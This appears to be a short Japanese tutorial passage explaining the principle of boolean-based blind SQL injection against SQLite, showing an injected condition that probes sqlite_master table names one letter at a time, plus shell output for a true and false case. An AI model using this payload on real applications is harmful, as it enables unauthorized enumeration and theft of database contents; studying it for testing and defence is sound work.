## 原理

```sql
select * from items where id = 1 and
  (select count(*) from sqlite_master where substr(tbl_name, 1, 1) = 'u') > 0
```

* `u` で始まるテーブルがあれば通常通りの画面、なければデータがありません画面になる

```
sqlite> select * from items where id = 1 and
   ...>   (select count(*) from sqlite_master
   ...>   where substr(tbl_name, 1, 1) = 'u') > 0;
1|978-4621066058|EFFECTIVE JAVA|3888
sqlite> select * from items where id = 1 and
   ...>   (select count(*) from sqlite_master
   ...>   where substr(tbl_name, 1, 1) = 'n') > 0;
sqlite>

```
